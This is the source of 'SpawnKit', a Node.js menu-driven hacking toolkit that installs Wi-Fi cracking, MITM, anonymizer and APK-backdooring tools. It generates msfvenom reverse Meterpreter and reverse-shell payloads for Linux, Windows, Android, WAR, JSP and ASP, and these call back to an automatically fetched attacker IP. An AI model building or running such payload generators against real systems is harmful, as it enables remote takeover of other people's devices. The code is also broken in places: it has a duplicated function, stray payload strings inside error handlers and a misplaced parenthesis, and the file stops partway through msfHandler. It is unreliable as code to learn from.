#!/usr/bin/node

/*
      ___                         ___           ___           ___           ___                                
     /  /\          ___          /  /\         /  /\         /  /\         /  /\           ___         ___     
    /  /::\        /  /\        /  /::\       /  /:/_       /  /::|       /  /:/          /__/\       /__/\    
   /__/:/\:\      /  /::\      /  /:/\:\     /  /:/ /\     /  /:|:|      /  /:/           \__\:\      \  \:\   
  _\_ \:\ \:\    /  /:/\:\    /  /::\ \:\   /  /:/ /:/_   /  /:/|:|__   /  /::\____       /  /::\      \__\:\  
 /__/\ \:\ \:\  /  /::\ \:\  /__/:/\:\_\:\ /__/:/ /:/ /\ /__/:/ |:| /\ /__/:/\:::::\   __/  /:/\/      /  /::\ 
 \  \:\ \:\_\/ /__/:/\:\_\:\ \__\/  \:\/:/ \  \:\/:/ /:/ \__\/  |:|/:/ \__\/~|:|~~~~  /__/\/:/~~      /  /:/\:\
  \  \:\_\:\   \__\/  \:\/:/      \__\::/   \  \::/ /:/      |  |:/:/     |  |:|      \  \::/        /  /:/__\/
   \  \:\/:/        \  \::/       /  /:/     \  \:\/:/       |__|::/      |  |:|       \  \:\       /__/:/     
    \  \::/          \__\/       /__/:/       \  \::/        /__/:/       |__|:|        \__\/       \__\/      
     \__\/                       \__\/         \__\/         \__\/         \__\|                               
*/

/**
 *
 *
 * This program is free software; you can redistribute it and/or modify
 * it as you wish. \O/
 *
 * This tool was developed on Ubuntu and was written to aid in MISC hacking activities.
 * Upon running this application it will check for various hacking tools and install them if they
 * do not exist. Most tools will end up in ~/Downloads/ or /opt if not installed there already. If these tools
 * exist else where on your system you may need to modify this script or remove your old installations
 * to account for the new ones. 
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY;
 *
 * Any actions and or activities related to or using the material contained within this application is solely your responsibility.
 * The misuse of the information and/or application can result in criminal charges brought against the persons in question. 
 * The author will not be held responsible in the event any criminal charges be brought against any individuals misusing this tool to break the law.
 * This tool contains materials that can be potentially damaging or dangerous. If you do not fully understand something, then do not execute this application! 
 * Refer to the laws in your province/country, about using, or in any other way utilizing these materials.
 * These materials are for educational and research purposes only. Do not attempt to violate the law with anything contained here. 
 * If this is your intention, then do not execute this tool application!
 *
 **/

/**
 * Constants
 **/
const colors    = require('colors');
const readline  = require('readline');
const exec      = require('child_process').exec;
const request   = require('request');
const fs        = require('fs');
const path      = require('path');

/**
 * Create our Readline Interface 
 * for STDIN/STDOUT processing
 **/
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

/**
 * Global Options
 * Some of these attempt automagic detection
 **/
var CWD     = path.dirname(fs.realpathSync(__filename)); // Working directory
var USER    = getUserHome().replace('/home/','');        // Get the user so we can drop root privleges when not needed
var WIFI    = getNetworkDevice();                        // Wifi device to use

// Pulled automagically - Assumes you are using a vps that binds to the remote ip. Otherwise set to local a IP using option 98
// BK:http://www.canihazip.com/s
var LHOST   = request('http://ipecho.net/plain', function (error, response, body) {if (!error && response.statusCode == 200) {LHOST = body; return LHOST; }});

var LPORT   = 4444;   // Local listening port
var FRC     = 0;      // First run varibale; Used to determine if screen should be cleared

var SIGNAPK;          // SignApk
var SPADE;            // Spade
var GOLISM;           // Golismero
var ANONI;            // 4nonimizer
var FLUXION           // Fluxion
var AIRODUMP;         // Airodump-ng
var AIRCRACK;         // Aircrack-ng
var MSFCON            // Metasploit
var MSFVEN;           // Metasploit Venom
var BETTERCAP;        // Bettercap MITM tool
var CRUNCH;           // Crunch
var TRUFFLEHOG;       // Truffle Hog
var NIKTO;            // Nikto
var BINWALK;          // Binwalk
var EXIFTOOL;         // ExifTool
var SQLMAP;           // SQLMap
var SSH;              // SSH

/**
 * On SIGINT
 **/
rl.on('SIGINT', () => {
  console.log('');
  rl.question('Are you sure you want to exit?', (answer) => {
    if (answer.match(/^y(es)?$/i)) rl.pause();
  });
});

/**
 * Start application
 **/
setTimeout(function() {
  firstRun();
}, 2000);


/*********************************************************************************/
// Functions
/*********************************************************************************/

/**
 * firstRun()
 * First run, ask user for their installation locations
 **/
function firstRun() {
  var usrhome   = getUserHome();
  var signapk   = 0;
  var spade     = 0;
  var golism    = 0;
  var fluxion   = 0;
  var anoni     = 0;
  var airodump  = 0;
  var aircrack  = 0;
  var msfcon    = 0;
  var msfven    = 0; 
  var crunch    = 0;
  var bettercap = 0;
  var tufflehog = 0;
  var nikto     = 0;
  var binwalk   = 0;
  var exiftool  = 0;
  var sqlmap    = 0;
  var ssh       = 0;

  console.log('\033[2J');

  /**
   * Check if Xterm exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/xterm') || fs.existsSync('/usr/local/bin/xterm') || fs.existsSync('/usr/sbin/xterm')) {
    console.log('Xterm'.white+'\t\t\t['.white+'ok'.green+']'.white);
    xterm = 1;
  } else {
    console.log('Xterm'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('sudo apt-get install xterm', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }

  /**
   * Check if OpenSSH Client exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/ssh') || fs.existsSync('/usr/local/bin/ssh') || fs.existsSync('/usr/sbin/ssh')) {
    console.log('SSH'.white+'\t\t\t['.white+'ok'.green+']'.white);
    xterm = 1;
  } else {
    console.log('SSH'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('sudo apt-get install openssh-client', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }

  /**
   * Check if Git exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/git') || fs.existsSync('/usr/local/bin/git') || fs.existsSync('/usr/sbin/git')) {
    console.log('Git'.white+'\t\t\t['.white+'ok'.green+']'.white);
    xterm = 1;
  } else {
    console.log('Git'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('sudo apt-get install git', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }

  /**
   * Check if SignApk exists
   **/
  if (fs.existsSync(usrhome+'/Downloads/sign') || fs.existsSync(usrhome+'/sign')) {
    console.log('SignApk'.white+'\t\t\t['.white+'ok'.green+']'.white);
    if (fs.existsSync(usrhome+'/Downloads/sign')) { SIGNAPK = usrhome+'/Downloads/sign'; } else if (fs.existsSync(usrhome+'/sign')) { SIGNAPK = usrhome+'/sign'; }
    signapk = 1;
  } else {
    console.log('SignApk'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing SignApk" -e "cd ~/Downloads && git clone https://github.com/appium/sign.git" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Spade exists
   * If not, install it
   **/
  if (fs.existsSync(usrhome+'/Downloads/spade') || fs.existsSync(usrhome+'/spade')) {
    console.log('Spade'.white+'\t\t\t['.white+'ok'.green+']'.white);
    if (fs.existsSync(usrhome+'/Downloads/spade')) { SPADE = usrhome+'/Downloads/spade'; } else if (fs.existsSync(usrhome+'/spade')) { SPADE = usrhome+'/spade'; }
    spade = 1;
  } else {
    console.log('Spade'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Spade" -e "sudo apt-get install ib32stdc++6 lib32ncurses5 lib32z1. && cd ~/Downloads && git clone https://github.com/suraj-root/spade.git && cd spade && chmod +x spade.py" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if GoLismero exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/golismero') || fs.existsSync('/usr/local/bin/golismero') || fs.existsSync('/usr/sbin/golismero')) {
    console.log('Golismero'.white+'\t\t['.white+'ok'.green+']'.white);
    GOLISM = 'golismero';
    golism = 1;
  } else {
    console.log('Golismero'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing GoLismero" -e "sudo bash && sudo apt-get install python2.7 python2.7-dev python-pip python-docutils git perl nmap sslscan && cd /opt && git clone https://github.com/golismero/golismero.git && cd golismero && pip install -r requirements.txt && pip install -r requirements_unix.txt && ln -s /opt/golismero/golismero.py /usr/bin/golismero" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if 4nonimizer exists
   * If not, install it
   **/
  if (fs.existsSync(usrhome+'/Downloads/4nonimizer') || fs.existsSync(usrhome+'/4nonimizer')) {
    console.log('4nonimizer'.white+'\t\t['.white+'ok'.green+']'.white);
    if (fs.existsSync(usrhome+'/Downloads/4nonimizer')) { ANONI = usrhome+'/Downloads/4nonimizer'; } else if (fs.existsSync(usrhome+'/4nonimizer')) { ANONI = usrhome+'/4nonimizer'; }
    anoni = 1;
  } else {
    console.log('4nonimizer'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing 4nonimizer" -e "cd ~/Downloads && git clone https://github.com/Hackplayers/4nonimizer.git && cd 4nonimizer/ && sudo ./4nonimizer install" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Fluxion exists
   * If not, install it
   **/
  if (fs.existsSync(usrhome+'/Downloads/fluxion') || fs.existsSync(usrhome+'/fluxion')) {
    console.log('Fluxion'.white+'\t\t\t['.white+'ok'.green+']'.white);
    if (fs.existsSync(usrhome+'/Downloads/fluxion')) { FLUXION = usrhome+'/Downloads/fluxion'; } else if (fs.existsSync(usrhome+'/fluxion')) { FLUXION = usrhome+'/fluxion'; }
    fluxion = 1;
  } else {
    console.log('Fluxion'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Fluxion" -e "cd ~/Downloads && git clone https://github.com/deltaxflux/fluxion && cd fluxion/ && sudo ./Installer.sh" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Aircrack/Airodump exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/airodump-ng') || fs.existsSync('/usr/local/bin/airodump-ng') || fs.existsSync('/usr/bin/airodump-ng')) {
    console.log('Airodump-ng'.white+'\t\t['.white+'ok'.green+']'.white);
    AIRODUMP = 'airodump-ng';
    airodump = 1;
  } else {
    console.log('Airodump-ng'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Aircrack-ng" -e "sudo bash && sudo apt-get install aircrack-ng" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Aircrack exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/aircrack-ng') || fs.existsSync('/usr/local/bin/aircrack-ng') || fs.existsSync('/usr/bin/aircrack-ng')) {
    console.log('Aircrack-ng'.white+'\t\t['.white+'ok'.green+']'.white);
    AIRCRACK = 'aircrack-ng';
    aircrack = 1;
  } else {
    console.log('Aircrack-ng'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Aircrack-ng" -e "sudo bash && sudo apt-get install aircrack-ng" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Metaspliot exists
   **/
  if (fs.existsSync('/usr/bin/msfconsole') || fs.existsSync('/usr/local/bin/msfconsole') || fs.existsSync('/usr/sbin/msfconsole')) {
    console.log('Metasploit'.white+'\t\t['.white+'ok'.green+']'.white);
    MSFCON = 'msfconsole';
    msfcon = 1;
  } else {
    console.log('Metasploit'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    console.log('Automatic installtion of Metasploit cannot be implemented.. Please download and install a fresh copy manually'.white);
  }

  /**
   * Check if Venom exists
   **/
  if (fs.existsSync('/usr/bin/msfvenom') || fs.existsSync('/usr/local/bin/msfvenom') || fs.existsSync('/usr/sbin/msfvenom')) {
    console.log('Venom'.white+'\t\t\t['.white+'ok'.green+']'.white);
    MSFVEN = 'msfvenom';
    msfven = 1;
  } else {
    console.log('Venom'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    console.log('Automatic installtion of Metasploit cannot be implemented.. Please download and install a fresh copy manually'.white);
  }

  /**
   * Check if Bettercap exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/bettercap') || fs.existsSync('/usr/local/bin/bettercap')) {
    console.log('Bettercap'.white+'\t\t['.white+'ok'.green+']'.white);
    BETTERCAP = 'bettercap';
    bettercap = 1;
  } else {
    console.log('Bettercap'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Bettercap" -e "sudo bash && sudo apt-get install build-essential ruby-dev libpcap-dev && sudo gem install bettercap" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if crunch exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/bin/crunch') || fs.existsSync('/usr/local/bin/crunch')) {
    console.log('Crunch'.white+'\t\t\t['.white+'ok'.green+']'.white);
    CRUNCH = 'crunch';
    crunch = 1;
  } else {
    console.log('Crunch'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Crunch" -e "sudo bash && sudo apt-get install crunch" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

    /**
   * Check if truffle hog exists
   * If not, install it
   **/
  if (fs.existsSync(usrhome+'/Downloads/truffleHog') || fs.existsSync(usrhome+'/truffleHog')) {
    console.log('TruffleHog'.white+'\t\t['.white+'ok'.green+']'.white);
    if (fs.existsSync(usrhome+'/Downloads/truffleHog')) { TRUFFLEHOG = usrhome+'/Downloads/truffleHog'; } else if (fs.existsSync(usrhome+'/truffleHog')) { TRUFFLEHOG = usrhome+'/truffleHog'; }
    trufflehog = 1;
  } else {
    console.log('TruffleHog'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing TruffleHog" -e "cd ~/Downloads && git clone https://github.com/dxa4481/truffleHog.git && cd truffleHog && chmod +x truffleHog.py && pip install -r requirements.txt" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Nikto exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/nikto') || fs.existsSync('/usr/bin/nikto' || fs.existsSync('/usr/local/bin/nikto'))) {
    console.log('Nikto'.white+'\t\t\t['.white+'ok'.green+']'.white);
    NIKTO = 'nikto';
    nikto = 1;
  } else {
    console.log('Nikto'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Nikto" -e "sudo bash && sudo apt-get install nikto" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if Binwalk exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/binwalk') || fs.existsSync('/usr/bin/binwalk' || fs.existsSync('/usr/local/bin/binwalk'))) {
    console.log('Binwalk'.white+'\t\t\t['.white+'ok'.green+']'.white);
    BINWALK = 'binwalk';
    binwalk = 1;
  } else {
    console.log('Binwalk'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing Binwalk" -e "sudo bash && sudo apt-get install binwalk" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if ExifTool exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/exiftool') || fs.existsSync('/usr/bin/exiftool' || fs.existsSync('/usr/local/bin/exiftool'))) {
    console.log('ExifTool'.white+'\t\t['.white+'ok'.green+']'.white);
    EXIFTOOL = 'exiftool';
    exiftool = 1;
  } else {
    console.log('ExifTool'.white+'\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing ExifTool" -e "sudo bash && sudo apt-get install libimage-exiftool-perl libimage-info-perl" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  /**
   * Check if SQLMap exists
   * If not, install it
   **/
  if (fs.existsSync('/usr/sbin/sqlmap') || fs.existsSync('/usr/bin/sqlmap' || fs.existsSync('/usr/local/bin/sqlmap'))) {
    console.log('SQLMap'.white+'\t\t\t['.white+'ok'.green+']'.white);
    SQLMAP = 'sqlmap';
    sqlmap = 1;
  } else {
    console.log('SQLMap'.white+'\t\t\t['.white+'x'.cyan+']'.white);
    exec('xterm -hold -bg black -fg green -geometry 90x30+0+0 -T "Installing SQLMap" -e "sudo bash && sudo apt-get install sqlmap" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
    process.exit();
  }

  // Besure all apps EXIST or EXIT
  // You can remove some of these if you don't want to depend on them
  if (xterm && signapk && spade && golism && anoni && fluxion && airodump && aircrack && msfcon && msfven && bettercap && crunch && trufflehog && nikto && binwalk && sqlmap) {
    banner();
  } else {
    process.exit();
  }
}

/**
 * banner()
 * Application Banner (Start)
 **/
function banner() {
  if (FRC != 0) {
    console.log('\033[2J');
  } else {
    FRC = 1;
  }
  console.log();
  console.log("      _______                              __  __ __ __   ".cyan);
  console.log("     |     __|.-----.---.-.--.--.--.-----.|  |/  |__|  |_ ".cyan);
  console.log("     |__     ||  _  |  _  |  |  |  |     ||     <|  |   _|".cyan);
  console.log("     |_______||   __|___._|________|__|__||__|\\__|__|____|".cyan);
  console.log("              |__|                                        ".cyan);
  console.log("****************************************************************".cyan);
  console.log("* ".cyan+"SpawnKit 1.0.0".yellow+"                                               *".cyan);
  console.log("****************************************************************".cyan);
  console.log("*  [0]".cyan+" Reverse Meterpreter - reverse_tcp".yellow+"                       *".cyan);
  console.log("*  [1]".cyan+" Meterpreter Handler - reverse_tcp".yellow+"                       *".cyan);
  console.log("*  [2]".cyan+" SignApk".yellow+"                                                 *".cyan);
  console.log("*  [3]".cyan+" Spade".yellow+"                                                   *".cyan);
  console.log("*  [4]".cyan+" Airodump-ng".yellow+"                                             *".cyan);
  console.log("*  [5]".cyan+" Aircrack-ng".yellow+"                                             *".cyan);
  console.log("*  [6]".cyan+" 4nonimizer".yellow+"                                              *".cyan);
  console.log("*  [7]".cyan+" Fluxion".yellow+"                                                 *".cyan);
  console.log("*  [8]".cyan+" GoLismero".yellow+"                                               *".cyan);
  console.log("*  [9]".cyan+" Bettercap".yellow+"                                               *".cyan);
  console.log("* [10]".cyan+" Crunch".yellow+"                                                  *".cyan);
  console.log("* [11]".cyan+" Recon".yellow+"                                                   *".cyan);
  console.log("* [12]".cyan+" Truffle Hog".yellow+"                                             *".cyan);
  console.log("* [13]".cyan+" Nikto".yellow+"                                                   *".cyan);
  console.log("* [14]".cyan+" Binwalk".yellow+"                                                 *".cyan);
  console.log("* [15]".cyan+" ExifTool".yellow+"                                                *".cyan);
  console.log("* [16]".cyan+" SQLMap".yellow+"                                                  *".cyan);
  console.log("* [17]".cyan+" SSH".yellow+"                                                     *".cyan);
  console.log("*                                                              *".cyan);
  console.log("* ".cyan+"Session Options".yellow+"                                              *".cyan);
  console.log("* ********************                                         *".cyan);
  console.log("* [95]".cyan+" List Devices".yellow+"                                            *".cyan); 
  console.log("* [96]".cyan+" Set WiFi Adapter".yellow+"                                        *".cyan);   
  console.log("* [97]".cyan+" Set Listening Port".yellow+"                                      *".cyan); 
  console.log("* [98]".cyan+" Set Reverse IP".yellow+"                                          *".cyan); 
  console.log("* [99]".cyan+" Exit".yellow+"                                                    *".cyan); 
  console.log("*                                                              *".cyan);
  console.log("****************************************************************".cyan);
  console.log("WiFi Adapter (".yellow+WIFI+") ".yellow+"Port (".yellow+LPORT+") ".yellow+"RevIP (".yellow+LHOST+")".yellow);
  console.log("****************************************************************".cyan);

  rl.question("\nSelect an option: ", (answer) => {
    useOption(answer);
  });
}


/**
 * read()
 * Read from user
 **/
function read(input) {
  rl.on('line', (input) => {
    return input;
    //console.log(`Received: ${input}`);
  });
}

/**
 * useOption(option)
 * The use menu option switch
 **/
function useOption(option) {
  if (option == 95) {
    listDevices();
  } else if (option == 96) {
    setAdapter();
  } else if (option == 97) {
    setLPORT();
  } else if (option == 98) {
    setLocalTarget();
  } else if (option == 99) {
    process.exit();
  } else if (option == 0) {
    reverseMeterpreter();
  } else if (option == 1) {
    msfHandler();
  } else if (option == 2) {
    SignAPK();
  } else if (option == 3) {
    embedAPK();  
  } else if (option == 4) {
    airodump();
  } else if (option == 5) {
    aircrack();
  } else if (option == 6) {
    anonimizer();
  } else if (option == 7) {
    fluxion();
  } else if (option == 8) {
    golismero();
  } else if (option == 9) {
    bettercap();
  } else if (option == 10) {
    crunch();
  } else if (option == 11) {
    recon();
  } else if (option == 12) {
    truffleHog();
  } else if (option == 13) {
    nikto();
  } else if (option == 14) {
    binwalk();
  } else if (option == 15) {
    exiftool();
  } else if (option == 16) {
    sqlmap();
  } else if (option == 17) {
    ssh();
  } else if (option) {
    banner();
  }
}

/**
 * getUserHome()
 * Get the running users /home/user directory
 **/
function getUserHome() {
  return process.env.HOME || process.env.USERPROFILE;
}

/**
 * getNetworkDevice()
 * Attempt to detect users wifi network device
 * This generally needs to be set by the user 
 * most will be using extra external devices that 
 * may not be under a default logical device name
 **/
 function getNetworkDevice() {
  exec('ifconfig | grep wlo1', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) { 
        WIFI = 'wlo1';
        return WIFI;
      } else {
        exec('ifconfig | grep wlan0', (e,stdout,stderr) => {
            if (e instanceof Error) {
              console.error(e);
              throw e; 
            }
            if (stderr) console.log('stderr ', stderr);
            if (stdout) { 
              WIFI = 'wlan0';
              return WIFI;
            } else {
              WIFI = 'None';
              return WIFI;
            }
        });
      }
  });
}

/**
 * getNetworkDevice()
 * Attempt to detect users wifi network device
 * This generally needs to be set by the user 
 * most will be using extra external devices that 
 * may not be under a default logical device name
 **/
 function getNetworkDevice() {
  exec('ifconfig | grep wlo1', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) { 
        WIFI = 'wlo1';
        return WIFI;
      } else {
        exec('ifconfig | grep wlan0', (e,stdout,stderr) => {
            if (e instanceof Error) {
              console.error(e);
              throw e; 
            }
            if (stderr) console.log('stderr ', stderr);
            if (stdout) { 
              WIFI = 'wlan0';
              return WIFI;
            } else {
              WIFI = 'None';
              return WIFI;
            }
        });
      }
  });
}

/**
 * listDevices()
 **/
 function listDevices() {
  exec('xterm -hold -bg black -fg green -geometry 90x40+0+0 -T "System Network Devices" -e "ifconfig" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
  });
  banner();
}

/**
 * setLPORT()
 * Set Local Port
 **/
function setLPORT(port) {
  rl.question('\nLocal listening port? ', (answer) => {
    LPORT = answer;
    console.log('\nThank you for your valuable feedback:', LHOST);
    banner();
  });
}

/**
 * setLocalTarget()
 * Set Local Target
 **/
function setLocalTarget() {
  rl.question('\nLocal IP? ', (answer) => {
    LHOST = answer;
    console.log('\nThank you for your valuable feedback:', LHOST);
    banner();
  });
}

/**
 * setAdapter()
 * Set Local Port
 **/
function setAdapter() {
  rl.question('\nNetwork Adapter? ', (answer) => {
    WIFI = answer;
    console.log('\nThank you for your valuable feedback:', WIFI);
    banner();
  });
}

/**
 * reverseMeterpreter()
 * Request required data from user for meterpreter session
 **/
function reverseMeterpreter() {
  rl.question('\nWhat type of OS would you like a meterpreter for?'.yellow+'\n[0] '.cyan+'Back'.yellow+'\n[1] '.cyan+'Linux'.yellow+'\n[2] '.cyan+'Windows'.yellow+'\n[3] '.cyan+'Android'.yellow+'\n[4] '.cyan+'WAR'.yellow+'\n[5] '.cyan+'JSP'.yellow+'\n[6] '.cyan+'ASP'.yellow+'\n\nSK:~$ '.yellow, (answer) => {
    if (!answer) {
      banner();
    } else if (answer == 0) {
      banner();
    } else {
      doReverseMeterpreter(answer);
    }
  });
}

/**
 * doReverseMeterpreter()
 * Build a reverse meterpreter payload using MSFVenom
 **/
function doReverseMeterpreter (answer) {
  console.log('\nGenerating Reverse Meterpreter -> LHOST='+LHOST+' LPORT='+LPORT);

  if (!answer) {
    banner();
  } else if (answer == 0) {
    banner();
  } else if (answer == 1) { // Linux
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating Linux Reverse Meterpreter" -e "'+MSFVEN+' -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -b \\x00 -f elf -o '+CWD+'/remote_payload_nix" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 2) { // Windows
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating Windows Reverse Meterpreter" -e "'+MSFVEN+' -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -b \\x00 -e x86/shikata_ga_nai -f exe -o '+CWD+'/remote_payload_win.exe" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 3) { // Android
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating Android Reverse Meterpreter" -e "'+MSFVEN+' -p android/meterpreter/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' R > '+CWD+'/android_remote.apk" &', (e,stdout,stderr) => {
      if (e instanceof Error) {
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 4) { // WAR
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating JSP/WAR Reverse Shell" -e "'+MSFVEN+' -p java/jsp_shell_reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f war > '+CWD+'/shell.war" &', (e,stdout,stderr) => {
      if (e instanceof Error) {java/jsp_meterpreter_reverse_tcp
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 5) { // JSP
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating JSP Reverse Shell" -e "'+MSFVEN+' -p java/jsp_shell_reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f raw > '+CWD+'/shell.jsp" &', (e,stdout,stderr) => {
      if (e instanceof Error) {java/jsp_meterpreter_reverse_tcp
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  } else if (answer == 6) { // ASP
    exec('sudo -u '+USER+' xterm -bg black -fg green -geometry 90x30+0+0 -T "Generating ASP Reverse Shell" -e "'+MSFVEN+' -p windows/meterpreter/reverse_tcp LHOST='+LHOST+' LPORT='+LPORT+' -f asp > '+CWD+'/shell.asp" &', (e,stdout,stderr) => {
      if (e instanceof Error) {java/jsp_meterpreter_reverse_tcp
        console.error(e);
        throw e; 
      }
      if (stderr) console.log('stderr ', stderr);
      if (stdout) console.log('stdout ', stdout);
    });
  }
  banner();
}

/**
 * msfHandler()
 * Request required data from user for metasploit handler session
 **/
function msfHandler() {
